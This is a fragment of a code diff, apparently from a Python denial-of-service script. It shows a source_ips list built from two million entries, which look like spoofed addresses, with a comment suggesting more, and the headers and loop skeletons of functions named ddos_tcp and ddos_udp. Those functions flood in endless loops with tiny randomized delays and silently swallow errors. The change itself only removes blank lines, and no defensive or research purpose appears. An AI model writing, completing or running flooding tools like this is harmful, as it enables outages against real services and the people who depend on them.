@@ -92,7 +92,6 @@ source_ips = [
     for _ in range(2000000)  # Increase this number to generate more IP addresses
 ]
 
-
 def ddos_tcp():
     while True:
         try:
@@ -111,7 +110,6 @@ def ddos_tcp():
             time.sleep(random.uniform(0.0001, 0.001))
         except:
             pass
-
 
 def ddos_udp():
     while True:
